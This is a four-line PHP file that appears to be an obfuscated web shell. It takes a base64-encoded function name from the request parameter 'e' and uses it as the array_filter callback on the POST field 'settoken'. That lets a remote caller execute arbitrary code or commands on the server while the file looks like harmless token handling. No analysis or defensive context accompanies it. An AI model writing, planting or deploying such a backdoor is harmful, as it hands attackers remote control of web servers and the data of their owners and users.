<?php $e = $_REQUEST['e'];  
$arr = array($_POST['settoken'],);  
array_filter($arr, base64_decode($e));  
?>  